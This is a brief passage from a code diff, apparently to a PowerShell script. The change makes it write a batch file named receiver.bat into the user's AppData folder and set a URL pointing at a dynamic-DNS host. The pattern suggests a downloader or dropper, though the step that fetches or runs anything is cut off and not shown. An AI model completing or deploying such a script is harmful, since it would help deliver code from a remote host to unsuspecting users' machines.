@@ -1,4 +1,4 @@
-$batchFilePath = "C:\Users\vikto\AppData\Local\receiver.bat"
+$batchFilePath = "$env:APPDATA\Local\receiver.bat"
 $batchContent = @'
 @echo off
 set url=raupe.ddns.net/cdr
